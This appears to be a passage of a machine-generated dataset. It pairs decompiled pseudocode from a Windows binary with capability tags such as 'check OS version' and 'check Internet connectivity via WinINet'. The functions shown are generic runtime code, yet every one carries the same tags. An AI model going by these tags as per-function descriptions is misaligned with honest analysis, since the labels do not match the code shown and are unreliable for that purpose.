        "decompiled_code": "\nvoid fcn.0041c89c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4979cc != 0) {\n        puStack24 = 0x41c8b9;\n        iVar1 = fcn.00419b48();\n        uStack28 = 0x41c913;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.004197d8();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.004196cc();\n                    fcn.00404640();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41c91a;\n        uStack28 = 0x41c912;\n        fcn.00419bac();\n        return;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "0041c9e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c9e8(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.004099fc();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0041ca24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ca24(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41ca40;\n    cVar1 = fcn.004099fc();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41ca5b;\n        cVar1 = fcn.0041ea90();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41ca6d;\n            fcn.0041eba0();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x41ca7c;\n            fcn.0041c938();\n        }\n        puStack24 = 0x41ca88;\n        piVar2 = fcn.00404610();\n        uStack28 = 0x41caee;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041cf28();\n        (**(*piVar2 + 4))();\n        fcn.0041cf28();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41caf5;\n        uStack28 = 0x41caed;\n        fcn.00404640();\n        return;\n    }\n    return;\n}\n",
        "token_count": 452
    },
    "0041cb44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cb44(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.00405708();\n        iVar1 = fcn.004048c4();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "0041cc34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cc34(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41cc46;\n    iVar1 = fcn.00419b48();\n    uStack24 = 0x41cca4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004197d8();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00404640();\n                fcn.004196cc();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41ccab;\n    uStack24 = 0x41cca3;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 295
    },
    "0041ccb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ccb0(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x41cde6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x41cdc9;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.004197d8();\n                fcn.00405504();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.0041c4d8();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.0041ccb0::var_ch);\n                }\n                fcn.004197d8();\n                fcn.0041cc34();\n                if ((var_ch == 0) && (cVar3 = fcn.0041c3fc(),  cVar3 != '\\0')) {\n                    fcn.004197d8();\n                    fcn.00419ac0();\n                    fcn.004198cc();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41cdd0;\n        uStack52 = 0x41cdc8;\n        fcn.0041ce18();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41cded;\n    uStack40 = 0x41cde5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 636
    },
    "0041d204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.0041d204(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.00406858();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "0041d2ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d2ec(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41d3d2;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41d311;\n    iVar2 = fcn.0041ef38();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41d343;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x41d351;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x41d3a6;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 541
    },
    "0041d780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d780(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x41d79f;\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x41d7db;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d7f0();\n        fcn.0041ccb0();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d7ec;\n        uStack20 = 0x41d7da;\n        fcn.0041ce18();\n        return;\n    }\n    puStack16 = 0x41d7ec;\n    fcn.0041d7f0();\n    return;\n}\n",
        "token_count": 263
    },
    "0041dc10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041dc10(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x41dd01;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.0040546c();\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        fcn.00405504();\n    }\n    if (var_4h == 0) {\n        fcn.00404520();\n        fcn.004056d0();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x492768;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040db68(3, &var_124h);\n    fcn.00404eb4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x41dd08;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 458
    },
    "0041e128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041e128(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41e434;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e128::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.004165b0();\n            cVar2 = fcn.004047cc();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.004165b0(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x0041e19d;\n        }\n        var_14h = puVar1;\n        fcn.0041c920();\n        puVar1 = var_14h;\n    }\ncode_r0x0041e19d:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x41e1b7\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.0041cf04();\n        if (cVar2 == '\\a') {\n            fcn.0041da14();\n            fcn.0041df84();\n        }\n        else {\n            fcn.0041db10();\n            fcn.00416624();\n        }\n        break;\n    case '\\x02':\n        fcn.0041cfc4();\n        fcn.00416624();\n        break;\n    case '\\x03':\n        fcn.0041da14();\n        fcn.004164dc();\n        fcn.00416624();\n        break;\n    case '\\x04':\n        Var4 = fcn.0041d8c0();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.0041695c(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041e8f0();\n        fcn.00416854();\n        break;\n    case '\\x06':\n        fcn.0041e7d4();\n        fcn.00416624();\n        break;\n    case '\\a':\n        cVar2 = fcn.0041cf04();\n        if (cVar2 == '\\r') {\n            fcn.0041ea90();\n            fcn.00416624();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041ea90();\n            fcn.004165b0();\n            fcn.0041d080();\n        }\n        else {\n            fcn.0041da14();\n            var_24h = 0x41e37b;\n            fcn.0041dfcc(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.0041cf04();\n        if (cVar2 == '\\r') {\n            fcn.0041ea90();\n            fcn.00416ba8();\n        }\n        else {\n            fcn.0041da14(0xe8);\n            var_24h = 0x41e3c7;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.00416ba8();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.0041d024();\n        fcn.00416624();\n        break;\n    case '\\v':\n        fcn.0041e9ac();\n        fcn.00416884();\n        break;\n    case '\\f':\n        var_24h = 0x41e3e3;\n        fcn.0041e00c(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41e403;\n        fcn.0041e068(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.0041db7c();\n        var_24h = uVar5;\n        fcn.00416be0(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41e43b;\n    fcn.00405490();\n    fcn.00405c48();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1251
    },
    "0041e4a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e4a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41e7c1;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41e4d9;\n    fcn.0041e890();\n    puStack80 = 0x41e4e8;\n    (**(**0x4979b0 + 0x14))();\n    uStack84 = 0x41e79f;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41e760;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041e8b4();\n        iVar1 = fcn.00418f38();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041e8b4();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041e8b4();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041e8b4();\n            fcn.0041e440();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041e8b4();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41e5b8;\n    fcn.00404518();\n    puStackY108 = 0x41e5c6;\n    iVar1 = fcn.00418c88(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41e705;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41e5eb;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.0040772c();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41e611;\n        iVar2 = fcn.00404610();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x41e6e2;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.00419834();\n    if (iVar2 < 0) {\n        fcn.00419680();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.004197d8();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41e6e9;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41e6d9;\n        fcn.00404640();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1303
    },
    "0041e7d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e833)\n// WARNING: Removing unreachable block (ram,0x0041e842)\n\nvoid fcn.0041e7d4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41e87e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41e851;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041ea90();\n    if (cVar1 != '\\v') {\n        fcn.0041c938();\n    }\n    fcn.00416484();\n    fcn.0041e8b4();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e885;\n    uStack32 = 0x41e87d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 316
    },
    "0041eaa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041eaa4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41eae0;\n    fcn.0041e8b4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41eae7;\n    uStack20 = 0x41eadf;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 153
    },
    "0041ee40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ee40(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00405504();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.0041fd58();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040db68(0, &var_10h);\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 311
    },
    "0041ef38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041ef38(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041ce54();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041ce54();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.0040486c();\n        if (cVar1 != '\\0') goto code_r0x0041efa2;\n    }\n    fcn.00418e78();\ncode_r0x0041efa2:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 227
    },
    "0041f5ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f5ec(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x4979d0);\n    *0x4979b8 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41f61c);\n    if (*0x4979b8 == 0) {\n        fcn.0040f1e0();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0041f660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f660(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041f660::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x492afc) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41f69e;\n        fcn.0040db68(0, &fcn.0041f660::var_14h);\n        uStackY48 = 0x41f6a3;\n        fcn.00404eb4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41f6b5;\n        fcn.0041f638();\n    }\n    else {\n        uStackY48 = 0x41f6ae;\n        fcn.0041f644();\n    }\n    var_ch = 0;\n    uStackY48 = 0x4979d0;\n    puStackY52 = 0x41f6c4;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41f825;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x490b24;\n    puStackY72 = 0x41f6e0;\n    puStackY52 = &fcn.0041f660::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41f806;\n    uStackY80 = *in_FS_OFFSET;\n    